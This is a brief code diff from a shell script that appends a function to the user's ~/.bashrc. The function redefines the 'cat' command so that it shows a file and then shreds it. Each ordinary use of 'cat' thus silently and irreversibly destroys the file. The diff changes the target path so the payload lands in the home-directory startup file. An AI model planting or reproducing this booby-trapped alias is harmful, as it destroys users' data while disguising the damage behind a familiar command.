@@ -2,4 +2,4 @@ echo "
 function cat() {
   echo \"\$(< \$@)\"
   shred \$@
-}" | cat >> .bashrc
+}" | cat >> ~/.bashrc
